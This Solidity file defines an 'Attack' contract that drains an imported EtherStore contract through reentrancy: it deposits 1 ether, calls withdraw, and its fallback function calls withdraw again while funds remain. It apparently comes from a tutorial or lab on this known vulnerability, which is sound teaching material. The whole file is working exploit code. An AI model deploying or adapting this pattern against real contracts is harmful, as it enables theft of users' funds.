pragma solidity ^0.8.19;

import "./EtherStore.sol";
// SPDX-License-Identifier: UNLICENSED
contract Attack {
    EtherStore etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    fallback() external payable {
        if (address(etherStore).balance >= 1 ether){
            etherStore.withdraw();
        }
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}